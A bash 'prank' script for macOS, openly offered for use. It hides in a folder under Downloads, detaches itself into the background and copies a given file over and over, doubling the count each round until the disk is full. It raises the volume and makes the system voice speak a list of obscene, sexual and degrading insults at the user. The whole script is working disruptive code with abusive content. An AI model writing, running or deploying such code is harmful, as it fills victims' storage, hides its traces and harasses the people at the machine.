#!/bin/bash

# Karan's Ultimate Prank v3.9.2 - FINAL FIXED EDITION


VERSION="3.9.2"
HIDDEN_DIR="$HOME/Downloads/.Karan"

# Colors (REMOVED BLINK)
RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
BLUE='\033[0;34m'; PURPLE='\033[0;35m'; CYAN='\033[0;36m'
BOLD='\033[1m'; BG_GREEN='\033[42m'
BG_RED='\033[41m'; BG_YELLOW='\033[43m'; BG_PURPLE='\033[45m'
WHITE='\033[1;37m'; NC='\033[0m'

# DARK GRITTY MESSAGES (Visual)
DARK_MESSAGES=(
    "🎪 Welcome to Karan's exponential circus of doom!"
    "🔥 Burning through bytes like a digital inferno!"
    "💀 Your storage meets its exponential executioner!"
    "⚡ Doubling faster than your mounting dread!"
    "🌪️ Creating exponential chaos from digital hell!"
    "🎯 Exponential bullseye to your disk's heart!"
    "🚀 To infinity with exponential destruction!"
    "💎 Each doubling creates cursed gems!"
    "🔮 Predicting exponential digital apocalypse!"
    "🎨 Painting exponential nightmares on your drive!"
    "🎵 Can you hear your hard drive's death rattle?"
    "🍕 Exponential pizza slices of destruction!"
    "🌟 Making your disk famous for all the wrong reasons!"
    "🎭 Exponential masterpiece of digital carnage!"
    "⚡ Charging exponential storage anxiety to lethal levels!"
    "🎪 Greatest exponential horror show on earth!"
    "☠️ Your data's last supper is being served!"
    "🕷️ Spinning the web of destruction around your disk!"
    "☢️ Radioactive storage meltdown incoming!"
    "🧟‍♂️ Zombies are eating your free space alive!"
    "💀 Skeletons dancing on your hard drive's grave!"
    "🎃 Halloween came early: your disk is haunted!"
    "🌑 Black hole of storage: nothing escapes!"
    "🔪 Cutting your space like a digital surgeon!"
    "🌪️ Tornado tearing through your megabytes!"
    "💣 Storage bomb exploding bytes everywhere!"
    "🩸 Bloodbath on your file system!"
    "☣️ Virus unleashed: storage under quarantine!"
    "👻 Ghost files creeping in the digital shadows!"
    "🧨 Dynamite fuse lit: boom time for your drive!"
    "⛓️ Chained to destruction, your disk can't escape!"
    "🦇 Bats swarming your precious storage space!"
    "🔥 Inferno rising: no file safe tonight!"
    "🗡️ Blade of deletion cutting deep!"
    "⚰️ Digging your storage's digital grave!"
    "🦠 Malicious multiplication virus spreading!"
    "🌋 Volcanic eruption of exponential files!"
    "🕸️ Caught in the spider's web of doom!"
    "💀 Grim reaper harvesting your gigabytes!"
    "🎪 Freak show: witness your disk's demise!"
    "🔥 Dante's inferno has nothing on this!"
    "👹 Demons feasting on your free space!"
    "🌊 Tsunami of files drowning your disk!"
    "⚡ Lightning strikes: your storage is toast!"
    "🎯 Target locked: disk destruction imminent!"
    "🧪 Mad scientist's experiment gone wrong!"
    "🦈 Sharks circling your dying storage!"
    "💀 Dance with death: exponential style!"
    "🔥 Phoenix rising from your storage ashes!"
)

# DARK AUDIO MESSAGES
DARK_AUDIO=(
    "Your disk is crying tears of binary despair!"
    "i know you're a shit-stained loser"
    "i know you're a fucking waste of skin"
    "i know you're a pathetic dumbfuck"
    "i know you're a stupid fucking bitch"
    "i know you're a useless fucking prick"
    "i know you're a fucking shit-for-brains"
    "i know you're a pathetic piece of fucking trash"
    "i know you're a fucking idiot sandwich"
    "Your precious files are screaming for mercy!"
    "i know you're a fucking dumb cunt"
    "i know you're a useless fucking cock"
    "i know you're a fucking dumbass motherfucker"
    "your asshole is a fucking black hole"
    "you're a fucking worthless cunt"
    "your tits are fucking disgusting"
    "you're a fucking dumbass motherfucker"
    "your dick is smaller than a fucking ant"
    "you're a fucking piece of shit"
    "your brain is fucking mush"
    "i know you're a worthless piece of shit"
    "i know you're a fucking dumb cunt"
    "i know you're a shit-stained loser"
    "i know you're a fucking waste of skin"
    "Your hard drive is haunted by digital ghosts!"
    "you're a fucking cocksucking cunt"
    "your pussy stinks like rotten fish"
    "you're a shit-eating piece of trash"
    "you're a fucking dumbfuck"
    "you're a fucking shit-stained loser"
    "your mouth is a fucking cesspool"
    "you're a fucking useless waste of skin"
    "your eyes are fucking beady"
    "you're a fucking pathetic piece of trash"
    "your nose is a fucking pig snout"
    "you're a fucking disgusting fuck"
    "your teeth are fucking rotten"
    "you're a fucking dumb cunt"
)

# Setup
setup() {
    mkdir -p "$HIDDEN_DIR"
    chflags hidden "$HIDDEN_DIR" 2>/dev/null || true
}

# Clean logging (no blinking)
log_msg() {
    echo -e "${1}${2}${NC}"
    echo "$(date): $2" >> "$HIDDEN_DIR/.log" 2>/dev/null || true
}

# Random dark message (no blinking)
dark_msg() {
    local msg=${DARK_MESSAGES[$RANDOM % ${#DARK_MESSAGES[@]}]}
    local colors=("$RED$BOLD" "$PURPLE$BOLD" "$YELLOW$BOLD" "$CYAN$BOLD" "$BG_RED$WHITE$BOLD")
    local color=${colors[$RANDOM % ${#colors[@]}]}
    log_msg "$color" "$msg"
}

# COMPLETELY FIXED: Only speak dark messages
speak_only_dark() {
    # Kill ALL existing audio processes
    pkill -f "say" 2>/dev/null || true
    sleep 0.2
    
    # Pick ONLY from dark audio messages
    local dark_line=${DARK_AUDIO[$RANDOM % ${#DARK_AUDIO[@]}]}
    
    # Speak ONLY the dark message (no file counts)
    osascript -e "set volume output volume 90" 2>/dev/null || true
    say "$dark_line" 2>/dev/null &
}

# EXPONENTIAL DUPLICATION WITH ONLY DARK AUDIO
exponential_destruction() {
    local payload="$1"
    local round=0
    local current_count=0
    local target_count=1
    
    # Setup
    setup
    cp "$payload" "$HIDDEN_DIR/.payload"
    
    log_msg "$BG_PURPLE$WHITE$BOLD" "🎭 Karan's Ultimate Prank v3.9.2 - FINAL FIXED!"
    log_msg "$BG_RED$WHITE$BOLD" "💀 ONLY dark audio, NO blinking spam!"
    
    # Epic dark startup (ONLY dark message)
    speak_only_dark
    
    log_msg "$RED$BOLD" "🚀 INITIATING EXPONENTIAL DIGITAL APOCALYPSE!"
    dark_msg
    
    # Create first file
    if ! cp "$HIDDEN_DIR/.payload" "$HIDDEN_DIR/karan_exp_$(printf "%08d" 1).jpg" 2>/dev/null; then
        log_msg "$RED$BOLD" "💾 IMMEDIATE DISK DEATH!"
        speak_only_dark
        return
    fi
    current_count=1
    
    log_msg "$BG_GREEN$WHITE$BOLD" "💀 ROUND 0: First victim created (Total: 1)"
    speak_only_dark
    
    # Exponential loop with ONLY dark audio
    while true; do
        round=$((round + 1))
        local new_target=$((target_count * 2))
        local files_to_create=$((new_target - current_count))
        
        log_msg "$BG_YELLOW$RED$BOLD" "🔥 ROUND $round: Doubling the carnage $current_count → $new_target!"
        dark_msg
        speak_only_dark
        
        # Create files
        local created_this_round=0
        for ((i=1; i<=files_to_create; i++)); do
            local new_file_num=$((current_count + i))
            local source_file_num=$(((new_file_num - 1) % current_count + 1))
            
            # Attempt duplication
            if ! cp "$HIDDEN_DIR/karan_exp_$(printf "%08d" $source_file_num).jpg" \
                    "$HIDDEN_DIR/karan_exp_$(printf "%08d" $new_file_num).jpg" 2>/dev/null; then
                log_msg "$BG_RED$WHITE$BOLD" "💀 DISK FLATLINED! Final body count: $((current_count + created_this_round))!"
                speak_only_dark
                return
            fi
            
            created_this_round=$((created_this_round + 1))
            
            # Dark commentary every 40 files (ONLY dark audio)
            if [[ $((created_this_round % 40)) -eq 0 ]]; then
                dark_msg
                speak_only_dark
            fi
            
            # Progress during large rounds
            if [[ $((created_this_round % 300)) -eq 0 ]] && [[ $files_to_create -gt 1000 ]]; then
                log_msg "$CYAN$BOLD" "⚡ Round $round carnage: $created_this_round/$files_to_create victims eliminated..."
                speak_only_dark
            fi
        done
        
        current_count=$new_target
        target_count=$new_target
        
        # Round completion (ONLY dark audio)
        log_msg "$BG_GREEN$WHITE$BOLD" "💀 ROUND $round COMPLETE: Total casualties = $current_count"
        dark_msg
        speak_only_dark
        
        # Milestones (ONLY dark audio, NO file number announcements)
        case $current_count in
            2)
                log_msg "$YELLOW$BOLD" "🎉 DOUBLED TO 2! The exponential nightmare begins!"
                speak_only_dark
                ;;
            16)
                log_msg "$RED$BOLD" "🔥 REACHED 16! Exponential hellfire unleashed!"
                speak_only_dark
                ;;
            256)
                log_msg "$PURPLE$BOLD" "💎 256 FILES! Exponential death mastery achieved!"
                speak_only_dark
                ;;
            4096)
                log_msg "$BG_RED$WHITE$BOLD" "🚀 4096 FILES! EXPONENTIAL ARMAGEDDON!"
                speak_only_dark
                ;;
            65536)
                log_msg "$BG_PURPLE$WHITE$BOLD" "👑 65,536 FILES! EXPONENTIAL EMPEROR OF DESTRUCTION!"
                speak_only_dark
                ;;
        esac
        
        # Extra dark message every round
        dark_msg
        speak_only_dark
        
        # Brief pause
        sleep 0.4
    done
}

# Validate
validate() {
    [[ "$(uname)" == "Darwin" ]] || { echo "💀 ERROR: macOS required!"; exit 1; }
    [[ -f "$1" ]] || { echo "🔍 ERROR: Payload not found!"; exit 1; }
}

# Execution
if [[ "$2" == "--execute" ]]; then
    exec >> "$HIDDEN_DIR/.log" 2>&1
    exponential_destruction "$1"
else
    validate "$1"
    setup
    "$0" "$1" --execute &
    disown
fi
